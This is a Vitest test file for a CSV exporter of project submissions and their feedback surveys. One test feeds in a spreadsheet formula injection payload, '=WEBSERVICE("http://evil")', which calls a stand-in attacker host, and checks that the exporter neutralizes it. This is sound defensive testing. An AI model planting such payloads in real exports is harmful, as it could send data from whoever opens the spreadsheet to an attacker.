import { describe, it, expect } from 'vitest';
import { submissionsToCsv } from '../submissions-csv.js';

const base = {
  createdAt: '2026-06-17T10:00:00.000Z',
  submitterName: 'Ada',
  lumaEmail: 'ada@example.com',
  projectTitle: 'Engine',
  projectBrief: 'A mechanical computer.',
  videoUrl: 'https://youtu.be/x',
  githubUrl: 'https://github.com/ada/x',
  late: false,
  agreedToTermsAt: '2026-06-17T10:00:00.000Z',
};

describe('submissionsToCsv', () => {
  it('emits a header with all feedback columns', () => {
    const csv = submissionsToCsv([]);
    const header = csv.split('\n')[0];
    for (const col of ['submitterName', 'lumaEmail', 'surfaces', 'surfacesPrimary', 'agentEnv', 'wouldKeepBuilding']) {
      expect(header).toContain(col);
    }
  });

  it('flattens the feedback survey (surfaces joined, string keys mapped)', () => {
    const csv = submissionsToCsv([
      { ...base, feedback: { surfaces: ['MCP', 'API'], surfacesPrimary: 'MCP', agentEnv: 'cursor', wouldKeepBuilding: 'yes' } },
    ]);
    const row = csv.split('\n')[1];
    expect(row).toContain('ada@example.com');
    expect(row).toContain('MCP; API');
    expect(row).toContain('cursor');
    expect(row).toContain('yes');
  });

  it('handles a submission with no feedback (blank feedback cells)', () => {
    const csv = submissionsToCsv([{ ...base, feedback: null }]);
    const row = csv.split('\n')[1];
    expect(row).toContain('Engine');
    // trailing feedback columns are empty, so the row ends with commas
    expect(row.endsWith(',,,,,,,')).toBe(true);
  });

  it('neutralizes spreadsheet formula injection in feedback text', () => {
    const csv = submissionsToCsv([
      { ...base, feedback: { biggestBlocker: '=WEBSERVICE("http://evil")' } },
    ]);
    expect(csv).toContain("'=WEBSERVICE"); // leading quote sentinel from csvCell
  });

  it('stamps a self-identifying trailing comment', () => {
    const csv = submissionsToCsv([{ ...base, feedback: null }], { programSlug: 'bitrefill-2026' });
    expect(csv).toContain('# program=bitrefill-2026');
  });
});
